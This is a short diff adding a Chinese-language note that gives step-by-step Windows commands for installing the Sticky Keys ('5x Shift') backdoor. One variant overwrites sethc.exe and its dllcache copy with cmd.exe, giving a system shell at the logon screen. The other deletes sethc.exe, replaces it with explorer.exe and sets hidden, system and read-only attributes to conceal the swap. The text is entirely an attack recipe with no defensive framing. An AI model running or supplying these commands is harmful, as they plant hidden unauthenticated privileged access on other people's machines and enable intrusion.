@@ -1,0 +1,15 @@
+安装5次shift后门，沾滞键后门，替换SHIFT后门：
+
+5次SHIFT，沾滞键后门：
+copy %systemroot%\system32\sethc.exe %systemroot%\system32\dllcache\sethc1.exe
+copy %systemroot%\system32\cmd.exe %systemroot%\system32\dllcache\sethc.exe /y
+copy %systemroot%\system32\cmd.exe %systemroot%\system32\sethc.exe /y
+
+替换SHIFT后门：
+attrib c:\windows\system32\sethc.exe -h -r -s
+attrib c:\windows\system32\dllcache\sethc.exe -h -r -s
+del c:\windows\system32\sethc.exe
+copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
+copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
+attrib c:\windows\system32\sethc.exe +h +r +s
+attrib c:\windows\system32\dllcache\sethc.exe +h +r +s
